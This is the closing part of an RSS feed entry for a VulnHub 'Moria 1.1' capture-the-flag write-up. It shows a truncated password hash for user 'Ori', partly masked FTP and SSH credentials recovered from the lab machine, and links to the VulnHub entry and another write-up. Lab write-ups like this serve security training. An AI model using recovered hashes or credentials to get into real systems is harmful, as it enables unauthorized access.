Ori:$6$1zYgjEIM$VQ0gvU7JjenS9WuiVjSeva8pbWnEXjqTmEdFnQRXKmTmXPXmt55/oyup40NiXD8J9GxmXF7DYiaHZDRshr.......................
</code></pre>
<h3>Credentials</h3>
<pre><code>ftp: Balrog/Mel...
ssh: Ori/span..
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/moria-11,187/">https://www.vulnhub.com/entry/moria-11,187/</a>  </li>
<li><a href="https://phackt.com/moria-vulnhub">https://phackt.com/moria-vulnhub</a>  </li>
</ul>]]></description>
      <category>vulnhub</category><category>writeup</category>    </item>
      </channel>
</rss>